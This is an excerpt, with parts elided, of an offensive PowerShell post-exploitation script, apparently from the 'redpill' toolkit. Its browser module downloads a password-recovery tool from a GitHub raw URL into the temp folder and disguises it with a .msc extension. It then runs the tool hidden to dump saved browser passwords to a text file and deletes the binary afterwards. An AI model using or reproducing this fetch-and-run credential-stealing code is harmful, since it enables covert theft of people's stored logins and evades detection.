...
If($ManyCats.IsPresent)
{
   ...
   If($Module -iMatch '^(browser)$')
   {
      ...
      write-host "  - " -ForegroundColor Yellow -NoNewline
      write-host "Downloading WebBrowserPass.exe to %TMP%"
   ...
   Else
   {
      ...
      ElseIf($Module -iMatch '^(browser)$')
      {
         ...
         iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/WebBrowserPassView.exe" -OutFile "$Env:TMP\WebBrowserPassView.msc"|Unblock-File
         Start-Process -WindowStyle Hidden powershell -ArgumentList ".\WebBrowserPassView.msc /stext webbrowser.txt" -Wait
   ...
   Remove-Item -Path "${Env:TMP}\WebBrowserPassView.msc" -Force 
}
